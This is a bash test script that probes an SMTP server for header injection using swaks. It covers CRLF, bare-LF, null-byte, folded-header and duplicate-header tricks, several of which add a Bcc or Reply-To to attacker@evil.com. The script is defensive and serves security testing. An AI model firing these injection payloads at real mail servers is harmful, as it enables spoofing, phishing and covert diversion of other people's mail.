#!/usr/bin/env bash
# Test: SMTP Header Injection (RFC 5322)
# Verifies the server rejects attempts to inject extra headers via CRLF sequences

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/config.sh"

echo "=== Header Injection Tests ==="

echo ""
echo "[1] Inject BCC via newline in From header"
swaks --to "$TO" \
  --from "${FROM}\r\nBcc: attacker@evil.com" \
  --server "$SERVER" --port "$PORT" $TLS_FLAGS \
  --auth-user "$AUTH_USER" --auth-password "$AUTH_PASS"
echo "EXPECTED: Server should reject or sanitize the injected Bcc header"

echo ""
echo "[2] Inject additional Subject header"
swaks --to "$TO" \
  --from "$FROM" \
  --header "Subject: Legit\r\nX-Injected: malicious" \
  --server "$SERVER" --port "$PORT" $TLS_FLAGS \
  --auth-user "$AUTH_USER" --auth-password "$AUTH_PASS"
echo "EXPECTED: Server should reject the message or strip injected header"

echo ""
echo "[3] Inject via bare LF (not CRLF)"
swaks --to "$TO" \
  --from "$FROM" \
  --header "Subject: Test\nBcc: attacker@evil.com" \
  --server "$SERVER" --port "$PORT" $TLS_FLAGS \
  --auth-user "$AUTH_USER" --auth-password "$AUTH_PASS"
echo "EXPECTED: Server should reject bare LF injection attempts"

echo ""
echo "[4] Null byte injection in header (actual null byte via DATA)"
# swaks doesn't interpret \x00, so we craft a raw message with an actual null byte
TMPFILE=$(mktemp)
printf "Subject: Test\x00Bcc: attacker@evil.com\r\nFrom: %s\r\nTo: %s\r\n\r\nBody\r\n" "$FROM" "$TO" > "$TMPFILE"
swaks --to "$TO" \
  --from "$FROM" \
  --data @"$TMPFILE" \
  --server "$SERVER" --port "$PORT" $TLS_FLAGS \
  --auth-user "$AUTH_USER" --auth-password "$AUTH_PASS"
rm -f "$TMPFILE"
echo "EXPECTED: Server should reject null bytes in headers"

echo ""
echo "[5] Inject Reply-To via folded header (actual tab character)"
# swaks doesn't interpret \t in --header, so we craft a raw message with actual tab
TMPFILE=$(mktemp)
printf "Subject: Normal Subject\r\n\tReply-To: attacker@evil.com\r\nFrom: %s\r\nTo: %s\r\n\r\nBody\r\n" "$FROM" "$TO" > "$TMPFILE"
swaks --to "$TO" \
  --from "$FROM" \
  --data @"$TMPFILE" \
  --server "$SERVER" --port "$PORT" $TLS_FLAGS \
  --auth-user "$AUTH_USER" --auth-password "$AUTH_PASS"
rm -f "$TMPFILE"
echo "EXPECTED: Server should not allow header injection via folding"

echo ""
echo "[6] Duplicate From header injection"
# swaks deduplicates --header flags, so use raw DATA with two From headers
TMPFILE=$(mktemp)
printf "From: %s\r\nFrom: attacker@evil.com\r\nTo: %s\r\nSubject: Dup From Test\r\nDate: Mon, 01 Jan 2026 00:00:00 +0000\r\n\r\nBody\r\n" "$FROM" "$TO" > "$TMPFILE"
swaks --to "$TO" \
  --from "$FROM" \
  --data @"$TMPFILE" \
  --server "$SERVER" --port "$PORT" $TLS_FLAGS \
  --auth-user "$AUTH_USER" --auth-password "$AUTH_PASS"
rm -f "$TMPFILE"
echo "EXPECTED: Server should reject duplicate From headers"

echo ""
echo "[7] Duplicate Subject header injection"
TMPFILE=$(mktemp)
printf "From: %s\r\nTo: %s\r\nSubject: Legit\r\nSubject: Phishing Subject\r\nDate: Mon, 01 Jan 2026 00:00:00 +0000\r\n\r\nBody\r\n" "$FROM" "$TO" > "$TMPFILE"
swaks --to "$TO" \
  --from "$FROM" \
  --data @"$TMPFILE" \
  --server "$SERVER" --port "$PORT" $TLS_FLAGS \
  --auth-user "$AUTH_USER" --auth-password "$AUTH_PASS"
rm -f "$TMPFILE"
echo "EXPECTED: Server should reject duplicate Subject headers"
